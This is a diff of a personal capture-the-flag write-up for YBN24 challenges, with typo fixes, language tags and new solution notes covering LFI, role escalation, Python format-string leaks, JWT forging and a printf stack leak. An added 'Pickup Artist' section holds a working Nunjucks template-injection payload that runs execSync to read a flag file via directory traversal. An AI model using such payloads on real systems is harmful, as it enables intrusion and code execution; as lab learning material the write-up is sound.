@@ -34,7 +34,7 @@ print("g = {}".format(g))
 print("n = {}".format(n))
 print("ct = {}".format(ct))
 ```
-For some reason, the inputs a and b are directly evaluated, so we can simple submit `print(flag)` as the input and we will get the flag.
+For some reason, the inputs a and b are directly evaluated, so we can simply submit `print(flag)` as the input, and we will get the flag.
 `YBN24{RS4_mu1t!prim3_f4ct0r1ng}`
 ## Inspector who
 "Hey I came across this website displaying a 3D model of the TARDIS! I wonder what I can find from INSPECTING this site..."
@@ -42,6 +42,7 @@ By using the power of inspect element, we find the flag
 ![[Pasted image 20241201110933.png]]
 `YBN24{1_l0v3_1n5p3ct_3l3m3nt}`
 ## Don't look at me!
+#langs/javascript
 Once again with the power of inspect element, we see that a script `decrypt.js` is being loaded
 ![[Pasted image 20241201111141.png]]It seems the script is obfuscated so we throw it into a js deobfuscator.
 ```js
@@ -81,14 +82,16 @@ From burp, only 3 requests contained the phrase `part`, meaning the last part of
 ![[Pasted image 20241202195228.png]]
 `YBN24{th1s_1s_4_c4ll_f0r_h3lp}`
 ## Simple website
+#langs/php
 For this challenge, the site seems to display whatever file it finds from the `?page=...` query parameter.
 ![[Pasted image 20241202195414.png]]
-As such, this is a LFI challenge and I started poking around for possible locations the flag might be. 
+As such, this is an LFI challenge and I started poking around for possible locations the flag might be. 
 ![[Pasted image 20241202195617.png]]After trying various paths, I found the flag in `/flag.txt`
 ![[Pasted image 20241202195533.png]]
 `YBN24{lfi_vuln3rable}`
 >  I didn't know text files could be directly included but it do be like that I guess
 ## Stationary threat
+#langs/python 
 Source code is provided for this challenge. The important parts are
 ```python
 roles = ['user', 'student','admin', 'teacher']
@@ -118,6 +121,7 @@ return render_template('nuke.html', flag=flag)
 Thus, a simple post request of `https://stationary-threat-stationary-threat-chall.ybn.sg/api/users/2/roles` allows us to obtain the admin role, then `/nuke`
 `YBN24{@utHEnT!cA71On?_wha7'S_7h4t?}`
 ## Number oracle
+#langs/python 
 A site where we have to consecutively guess the correct numbers. No source code is provided
 ![[Pasted image 20241202201153.png]]
 Since no source code was provided, I started poking around the page
@@ -169,6 +173,7 @@ print(session.cookies)
 ```
 `YBN24{D0nT_pUT_$3CR3Ts_IN_53S$1ON_coOk1Es_a2650f92c6893e5bb6437}`
 ## MORE KABOOMMMMM
+#langs/javascript 
 Source code is provided for this challenge.
 ![[Pasted image 20241202202146.png]]
 ```js
@@ -226,6 +231,7 @@ Our goal for this challenge is to *not* get Baba nuked, despite there always bei
 ![[Pasted image 20241202203101.png]]
 `YBN24{I_10VE_J4vaScR1P7}`
 ## Cool math games
+#langs/python
 Source code is provided. Similar to number oracle, we are supposed to guess the next number except this time without the server providing it.
 main.py:
 ```python
@@ -289,6 +295,7 @@ print(p.recvline())
 `YBN24{wH0_kN0w5_8a5H_R4nD0m_w4sn7_s0_rAnD0m_4ft3r_4ll}`
 > The seed can actually be found within the same connection to the server, thus we can both find the seed and then immediately start submitting guesses
 ## Memory sim
+#langs/python 
 A python pwn challenge that simulates memory(?). The goal of this challenge is to access a string from a restricted address. The functions for reading and writing to the memory are:
 ```python
 def write_string(s, ind):  
@@ -306,7 +313,7 @@ def read_string(ind):
         return -1  
     return "".join([chr(i) for i in MEMORY[ind:ind+stringLen]])
 ```
-* `write_string()`, which writes the ordinals of the characters in  string `s`  at the address space `[ind, ind+string length)`, and writes the length of the string at index `ind-1`. It returns the address we can use with `read_string()` to obtain the string from memory
+* `write_string()`, which writes the ordinals of the characters in string `s` at the address space `[ind, ind+string length)`, and writes the length of the string at index `ind-1`. It returns the address we can use with `read_string()` to obtain the string from memory
 * `read_string()`, which reads the length of the string at address `ind`, and reads the integers as characters from memory at the address space `[ind+1, ind+string length+1)`
 We then have the main program, responsible for taking and validating user input before calling those functions
 ```python
@@ -353,7 +360,7 @@ while True:
     else:  
         print("Invalid choice!")
 ```
-Here, we are restricted from writing at the read only region, and our input has to be a printable character. It should be noted there are no restrictions that prevent us from reading into the restricted region. By having `read_string` fetch the length of its string from an address where a character was stored instead of the strings length, we could read into the restricted region.
+Here, we are restricted from writing at the read only region, and our input has to be a printable character. It should be noted there are no restrictions that prevent us from reading into the restricted region. By having `read_string` fetch the length of its string from an address where a character was stored instead of the string's length, we could read into the restricted region.
 ```
 write_string('d', 898)
 | Address  |        897        |   898    |
@@ -388,6 +395,7 @@ Thus, our input is as such:
 3. 2 898
 `YBN24{n3g4tive_inDexeS_aNd_struCt_ov3rfl0W!}`
 ## View source revenge
+#langs/python
 A site that allows us to view the contents of any file
 ![[Pasted image 20241202212041.png]]
 I first tried viewing `flag.txt`, which returned an empty page
@@ -505,6 +513,8 @@ print(rv) # >> 889-177-408
 ![[Pasted image 20241202214006.png]]
 `YBN24{F1@sK_DEBUg_CH4L1?_1AM3}`
 ## NoButYes
+#langs/python 
+#misc/language-quirks 
 We are given source code for this challenge. The target of this challenge is the `/admin` endpoint, where our jwt token needs to identify we have admin
 ```python
 def get_secret(uuid):  
@@ -537,7 +547,7 @@ def admin():
     else:  
         return jsonify({"response": "Only admin's can access this page!", "status": 401})
 ```
-Further reviewing the source code, we also see the `/api` endpoint, which TODO finish sentence
+Further reviewing the source code, we also see the `/api` endpoint, which sets the session uuid and then signs and signs the token, saving it under the user's uuid . The token is also set as a cookie
 ```python
 def save_token(uuid, secret):  
     db = sqlite3.connect('secrets.db')  
@@ -577,7 +587,7 @@ def api():
     response.set_cookie('token', jwt_token)  
     return response
 ```
-From this code, it should be noted that each user has their jwt token signed with an individual secret that is not shared. The `generate_response()` function is also rather suspicious
+From this code, it should be noted that each user has their jwt token signed with an individual secret and not a shared global one. The `generate_response()` function is also rather suspicious
 ```python
 class RandomResponse:  
     def __init__(self, response: str):  
@@ -593,7 +603,7 @@ def generate_response(response, command):
     message = "{response.generated} but "+command+"."  
     return message.format(response = responseObj)
 ```
-For some reason, there is an entire class simply to generate a random message that is repeated a random number of times. Additionally, the `message.format` function seems to be able to access attributes of `RandomResponse`, as from `{response.generated}`. Googling, I found this interesting post on reddit: https://www.reddit.com/r/Python/comments/5kzhnn/be_careful_with_pythons_newstyle_string_format/. Using their payload as a POC, we can get this
+For some reason, there is an entire class simply to generate a random message that is repeated a random number of times. Additionally, the `message.format` function seems to be able to access attributes of `RandomResponse`, as from `{response.generated}`. Googling, I found this interesting post on Reddit: https://www.reddit.com/r/Python/comments/5kzhnn/be_careful_with_pythons_newstyle_string_format/. Using their payload as a POC, we can get this
 ![[Pasted image 20241202223217.png]]
 Using that, we are able to extract the flask secret key.
 ![[Pasted image 20241202215754.png]]
@@ -608,7 +618,7 @@ def get_secret(uuid):
 	secret = str(cursor.fetchone()) # <--
 	...
 ```
-Here, the result from the query is being cast to a string. This is usually not required, as a row should be returned as a string anyways. However, if the uuid queried were to not exist, the returned `None` would be cast into a string `"None"`, thus returning the secret as `"None"`. By forging a session  token with a non-existent uuid, we are able to sign jwt tokens with `"None"`.
+Here, the result from the query is being cast to a string. This is usually not required, as a row should be returned as a string anyways. However, if the uuid queried were to not exist, the returned `None` would be cast into a string `"None"`, thus returning the secret as `"None"`. By forging a session token with a non-existent uuid, we are able to sign jwt tokens with `"None"`.
 ![[Pasted image 20241202215911.png]]
 The final step is to access `/admin`, giving us the flag
 ![[Pasted image 20241202220039.png]]
@@ -621,14 +631,38 @@ The final step is to access `/admin`, giving us the flag
 > ```
 
 ## Needle in a haystack
+#langs/c
 TODO. This is more for personal use. Using `printf()` with user supplied input is dangerous as it allows memory in the stack to be leaked. We use `%<n>$s` here to brute force leaking the flag from the stack, where n is some number. I have yet to figure out how `printf()` calculates its offsets/addresses to read from based on the number we supply and the potential data types of varying arguments before the nth one. 
 `YBN24{FL4G_1N_4_ST4CK_XDDDDDD}`
 
 # Post ctf lessons
+## Pickup Artist (Finals chal, solved)
+#langs/javascript
+It is possible to traverse up a directory from a file, e.g. (`public/fileA/../secretFolder/secret.txt`)
+Basically persisting your payload and having control over the postfix of a filename allows for SSTI through directory traversal.
+Make payload: The filename consists of the payload hash + the first 10 characters of the payload. Hence, we are able to specify the file extension
+```json
+{
+	"pickup": "123456.njk{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /usr/src/app/flag.txt')\")()}}",
+	"pickupNum": 1
+}
+```
+Running the payload:
+```json
+{
+	"pickup": "anything",
+	"pickupNum": "1.njk/../../user_compliments/d3854df80759d071024bdd025b1bc6d8_123456"
+}
+```
+The server searches for `pickup{pickupNum}.njk`, hence the need to specify the njk file extension in the payload. 
+![[Pasted image 20241213180755.png]]
 ## Essay evaluator
-Usage of `...`  is a valid python object.
+#langs/python 
+
+Usage of `...` is a valid python object.
 https://stackoverflow.com/questions/772124/what-does-the-ellipsis-object-do
 ## RentAHitman 1
+#langs/python, #langs/sql 
 Always consider the full scope of a potential vulnerability you are targeting. In this case, I was too focused on trying not to trip the blacklist detection.
 ```python
 def detect_sqli(sql):  
@@ -695,6 +729,7 @@ Interestingly, chatgpt would have also pointed out the solution if you chatgpt'd
 https://chatgpt.com/share/674fd0a1-2870-800e-a95d-b7a7bc4bdc3e (Issue not mentioned)
 https://chatgpt.com/share/674fd0b0-6dec-800e-a95f-92c880c7ef2d (Issue mentioned)
 ## RentAHitman 2
+Actually a crypto chal. 
 https://en.wikipedia.org/wiki/Padding_oracle_attack
 "To my knowledge, Since AES-CBC block cipher is being used with a constant IV and a constant SALT, we are able to use an algorithm to guess each character one by one."
 ```python
